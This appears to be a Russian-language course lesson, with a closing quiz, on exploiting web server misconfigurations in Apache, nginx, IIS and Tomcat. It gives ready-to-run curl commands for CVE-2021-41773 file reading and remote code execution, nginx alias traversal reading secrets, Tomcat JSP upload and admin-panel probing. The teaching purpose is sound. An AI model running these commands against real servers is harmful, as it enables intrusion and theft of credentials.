---
id: web-server-misconfig
title: "Мисconfig серверов: Apache/nginx/IIS и alias traversal"
category: web
parent: web-architecture-basics
difficulty: medium
order: 2
tags: [apache, nginx, iis, misconfig, alias-traversal, cve]
prerequisites: [web-architecture]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 36
summary: "Ошибки конфигурации веб-серверов: alias traversal, небезопасные location, листинг каталогов, server-status, известные CVE."
---

Ошибки конфигурации веб-сервера (Apache/nginx/IIS) — отдельный класс, который часто даёт чтение файлов и обход путей без единой строки уязвимого кода. Классика: `alias`-traversal в nginx, `CVE-2021-41773` в Apache, раскрытие `.htaccess`/`web.config`, directory listing. Это ядро темы `svc-web-server`; здесь — практика по самым результативным конфигам.

## nginx: alias traversal

Если в конфиге `location /files { alias /data/files/; }` **без завершающего слэша** в `location`, то запрос `/files../secret` превращается в `/data/files/../secret` — обход каталога:

```nginx
location /static {
    alias /var/www/static/;   # безопасно (слэш есть)
}
location /files {
    alias /var/www/;          # УЯЗВИМО, если location без слэша
}
```

Эксплуатация:

```bash
curl -s --path-as-is "https://app.example/files../etc/passwd"
curl -s --path-as-is "https://app.example/files../app/config.php"
```

`--path-as-is` обязателен: curl по умолчанию нормализует `..`.

## nginx: небезопасные location

- `location ~ \.php$ { ... }` + `fastcgi_split_path_info` без проверки — исполнение загруженных файлов.
- `location / { try_files $uri $uri/ /index.php?$args; }` + upload — иногда даёт исполнение.
- Неверный `merge_slashes`/`internal` — доступ к внутренним локациям.
- Off-by-slash при `proxy_pass http://backend/` — обход.

## Apache: misconfigs

- **Directory listing** — `Options +Indexes` → перечисление файлов, бэкапы, исходники.
- **`.htaccess` доступен** — читаем правила/пароли (иногда `AuthUserFile` с хешами).
- **`server-status`/`server-info`** — `/server-status` открыт → внутренние URL, клиенты.
- **mod_cgi/mod_cgi-enabled** — исполнение CGI.
- **`.git`/`.svn` не запрещены** — утечка исходников (см. `web-git-env-exposure`).
- **CVE-2021-41773/42013** — path traversal + RCE (см. ниже).

## IIS: misconfigs

- **`~` (short name) disclosure** — 8.3-имена файлов; `IIS ShortName Scanner` восстанавливает длинные имена.
- **`web.config` доступен** — строки подключения, креды.
- **WebDAV включён** (`PUT`/`MOVE`) — загрузка/перемещение файлов.
- **`aspnet_client`**, **`trace.axd`** — утечки.
- **CVE-2017-7269** (WebDAV ScStoragePathFromUrl) — RCE в старых IIS.

## Разобранный пример: Apache CVE-2021-41773

Path traversal в Apache 2.4.49 (и RCE при включённом mod_cgi), 2.4.50 — обход через двойное кодирование.

Шаг 1 — определяем версию (см. `svc-web-server`, `web-tool-httpx-katana`):

```bash
curl -sI https://app.example/ | grep -i '^Server:'
```

Шаг 2 — path traversal (читаем `/etc/passwd`):

```bash
curl -s --path-as-is "https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

Шаг 3 — RCE через mod_cgi (если включён):

```bash
curl -s --path-as-is "https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
```

Для 2.4.50 обход — двойное кодирование `.%2e`.

## Разобранный пример: nginx alias traversal

Шаг 1 — ищем `location` без слэша: пробуем `/<dir>../` для типичных каталогов (`/static../`, `/files../`, `/assets../`).

```bash
curl -s --path-as-is "https://app.example/assets../index.php" | head
```

Шаг 2 — читаем чувствительные файлы:

```bash
curl -s --path-as-is "https://app.example/static../.env"
```

Шаг 3 — если нашли конфиг/креды — эскалируем (БД/админка).

## Разобранный пример: листинг/утечки

```bash
curl -s https://app.example/uploads/ | grep -iE 'href='      # directory listing
curl -s https://app.example/.htaccess
curl -s https://app.example/web.config
curl -s https://app.example/server-status
curl -s https://app.example/phpinfo.php
```

Каждый открытый артефакт — потенциальный секрет или карта приложения.

## Где искать

- Заголовок `Server:` и версии (Apache/nginx/IIS/Tomcat).
- Открытые каталоги, `.htaccess`, `web.config`, `server-status`.
- Конфиги с `alias`/`proxy_pass` (если утекли в git).
- Загруженные файлы рядом со скриптами (см. `web-file-upload-advanced`).

## Инструменты

- **`nuclei`** — теги `apache`, `nginx`, `iis`, `misconfig` (`nuclei_parse`).
- **`nikto`** — быстрый чеклист misconfig.
- **`ffuf`/`gobuster`** — каталоги/бэкапы (см. `web-tool-ffuf`).
- **`whatweb`/`httpx -tech-detect`** — версии.
- **`searchsploit`** — CVE под версию.

## Что дальше / decision

1. Определили сервер+версию → ищите CVE (Apache 2.4.49/50, IIS WebDAV).
2. nginx с `alias`/`proxy_pass` → проверьте `..`-traversal (`--path-as-is`).
3. Открыт directory listing → соберите файлы/бэкапы.
4. Нашли `.htaccess`/`web.config`/`server-status` → креды/карта.
5. Дальше — эскалация через найденные секреты/уязвимые версии.

## Частые ошибки

- **Использовать curl без `--path-as-is`.** `..` нормализуется — traversal не сработает.
- **Путать alias-traversal с LFI приложения.** Это конфиг сервера.
- **Не проверять версию.** N-day привязаны к точной версии.
- **Игнорировать directory listing.** Часто источник исходников.
- **Ломать прод.** Только чтение/безопасные проверки.

## Фингерпринт сервера: с чего начать

Прежде чем искать misconfig, определите точный сервер и версию.

```bash
# заголовки и версия
curl -sI https://app.example/ | grep -iE 'server|x-powered-by|x-aspnet-version'
# whatweb — общий фингерпринт
whatweb -a3 https://app.example | tee whatweb.txt
# nmap http-заголовки
nmap -p80,443 --script http-headers,http-title,http-server-header app.example
# favicon-hash — определяет продукт даже без заголовков
curl -s https://app.example/favicon.ico | mmh3sum
```

```bash
# проверка конкретных уязвимых версий
nuclei -u https://app.example -tags apache,nginx,iis,tomcat -j -silent | tee srv.json
```

Точная версия (Apache 2.4.49, nginx 1.20, IIS 10) сразу даёт список известных CVE и misconfig.

## Apache: path traversal и CVE

```bash
# CVE-2021-41773 / CVE-2021-42013 (Apache 2.4.49-2.4.50)
curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
# если включён mod_cgi — RCE
curl -s --path-as-is 'https://app.example/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; id'
# обход через двойное кодирование
curl -s --path-as-is 'https://app.example/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
```

Ключ — `--path-as-is`, иначе curl нормализует `..`. Проверяйте также `mod_negotiation` (multiviews), `.htaccess`-утечки, `server-status`/`server-info`.

## nginx: off-by-slash и alias traversal

```bash
# off-by-slash: location /static { alias /app/static/; }
curl -s 'https://app.example/static../app.py'
# alias traversal: location /i { alias /data/; }
curl -s 'https://app.example/i../../etc/passwd'
# утечка конфигов и листинг
curl -s 'https://app.example/nginx.conf'
curl -s 'https://app.example/..%2f..%2fetc%2fpasswd'
```

Причина: `alias` без слэша + отсутствие нормализации. Проверяйте все `location` с `alias`, `root`, `proxy_pass` и `internal`.

## IIS и Tomcat

```bash
# IIS: короткие имена (tilde), WebDAV, ASP.NET debug
curl -s 'https://app.example/~1/'            # short-name enumeration
curl -s 'https://app.example/default.asp::$DATA'
# Tomcat: manager, host-manager, примеры
curl -s https://app.example:8080/manager/html
curl -s https://app.example:8080/examples/
# Tomcat PUT (CVE-2017-12617) — только при readonly=false
curl -s -X PUT https://app.example/x.jsp -d '<% out.println(1); %>'
```

```bash
# Jenkins script console, Spring actuator
curl -s https://app.example:8080/script
curl -s https://app.example/actuator/env | jq .
```

## Инструменты

| Инструмент | Назначение |
|-----------|-----------|
| `whatweb` | фингерпринт стека |
| `nuclei` | CVE/misconfig-шаблоны |
| `nikto` | базовый аудит сервера |
| `ffuf` | перебор путей/файлов |
| `mmh3sum` | favicon-hash |
| `nmap --script` | http-* скрипты |

```bash
# массовый прогон
nikto -h https://app.example -o nikto.txt
nuclei -u https://app.example -severity medium,high,critical -j -silent | tee nuc.json
```

## Что делать дальше / решение

1. **Фингерпринт.** Версия сервера, модули, заголовки.
2. **Сопоставьте CVE.** По точной версии.
3. **Проверьте path traversal.** `--path-as-is`, кодировки.
4. **Проверьте admin/debug.** `server-status`, `manager`, `actuator`, `script`.
5. **Проверьте листинг/утечки.** `.htaccess`, бэкапы, конфиги.
6. **Зафиксируйте PoC.** Прочитанный файл / выполненная команда.

## Практика и справочники

- **HackTricks** — «Apache», «nginx», «Tomcat», «IIS».
- **nuclei templates** — `http/cves/` и `http/misconfiguration/`.
- **svc-web-server** — серверный playbook.
- **Vulhub** — стенды Apache/nginx.

## Приоритеты и типовые находки

Серверный misconfig ищут быстро и по чек-листу. Сначала фингерпринт (`whatweb`, `curl -I`, favicon-hash), затем сопоставление точной версии с CVE. Далее — три классических пути: path traversal (Apache `.%2e`, nginx alias, IIS `::$DATA`), открытые админ/дебаг-панели (`server-status`, `manager/html`, `actuator`, `script`) и утечки (листинг, бэкапы, конфиги). Каждая находка почти всегда даёт чтение файлов или RCE без сложной эксплуатации — поэтому серверный слой стоит проверять в первую очередь.

## Кратко

1. Фингерпринт версии → список CVE.
2. Path traversal (`--path-as-is`, кодировки).
3. Админ/дебаг-эндпоинты.
4. Утечки: `.htaccess`, конфиги, бэкапы, листинг.
5. PoC — прочитанный файл или выполненная команда.

## Практика

- **nuclei** — `http/misconfiguration/`, `http/cves/`.
- **HackTricks** — Apache/nginx/IIS/Tomcat.
- **Vulhub** — воспроизводимые стенды.

## Расширенный разбор: что проверять в первую очередь

| Приоритет | Проверка | Признак |
|-----------|----------|---------|
| 1 | точная версия сервера | известный CVE |
| 2 | path traversal | чтение `/etc/passwd` |
| 3 | открытые admin/debug | `server-status`, `actuator` |
| 4 | листинг директорий | список файлов |
| 5 | бэкапы/конфиги | `.bak`, `.old`, `.env` |
| 6 | небезопасные методы | `PUT`, `DELETE` |

```bash
# быстрый проход по приоритетам
curl -sI https://app.example/ | grep -i server
curl -s --path-as-is 'https://app.example/icons/.%2e/.%2e/etc/passwd' | head -1
curl -s -o /dev/null -w '%{http_code}\n' https://app.example/server-status
curl -s -o /dev/null -w '%{http_code}\n' https://app.example/.env
curl -s -X OPTIONS -i https://app.example/ | grep -i allow
```

Шесть проверок занимают минуты и покрывают большинство серверных misconfig-находок.

## Дополнительно: методы и заголовки

Опасны не только пути. Разрешение `PUT`/`DELETE`/`TRACE` даёт запись файлов или утечку cookie; `TRACE` часто считают безобидным, но он отражает заголовки. Проверяйте также `X-Powered-By` и `Server` на избыточность информации, а `Access-Control-Allow-Origin: *` — на CORS-риск.

## Ещё одна проверка

Не забудьте про HTTP/2 и HTTP/3: некоторые серверы по-разному обрабатывают псевдо-заголовки и downgrade, что даёт обход маршрутизации или smuggling. Проверьте `h2c`-upgrade и заголовки `:path` с закодированными dot-segments. Это особенно актуально для фронт-прокси, которые транслируют h2/h3 в h1.

## Финальная заметка

Все перечисленные проверки безопасны (чтение), кроме `PUT`/`DELETE` — их применяйте только с разрешения. Начните с чтения: версия, traversal, листинг, бэкапы. В большинстве случаев уже это даёт файл с секретами или подтверждённую уязвимость, которую можно оформить как PoC.

## Квиз

```quiz
- question: "Что такое alias traversal в nginx?"
  options:
    - "Ошибка DNS"
    - "Выход за каталог через alias без завершающего /"
    - "Шифрование"
    - "Кеш"
  answer: 1
  explanation: "Неверный location/alias позволяет .."
- question: "Какая версия Apache уязвима к CVE-2021-41773?"
  options:
    - "2.4.49"
    - "2.4.58"
    - "2.2.15"
    - "2.4.1"
  answer: 0
  explanation: "2.4.49/2.4.50 — path traversal."
- question: "Что даёт /server-status в Apache?"
  options:
    - "Пароли"
    - "Статус и запросы сервера (утечка)"
    - "TLS-ключ"
    - "Исходники"
  answer: 1
  explanation: "mod_status раскрывает активность."
- question: "Зачем --path-as-is в curl?"
  options:
    - "Ускоряет"
    - "Отправляет ../ без нормализации"
    - "Шифрует"
    - "Ставит cookie"
  answer: 1
  explanation: "Иначе curl схлопывает путь."
- question: "Что раскрывает IIS tilde?"
  options:
    - "Пароли"
    - "Короткие 8.3-имена скрытых файлов"
    - "TLS"
    - "Логи"
  answer: 1
  explanation: "Short filename enumeration."
```

## Где пригодится

- **CTF (Web):** задачи на миссконфиг сервера.
- **Bug bounty:** traversal/утечки сервера.
- **Пентест:** аудит инфраструктуры.
- **Работа (AppSec/DevOps):** корректные location/alias, отключение листинга/статуса, обновление серверов.
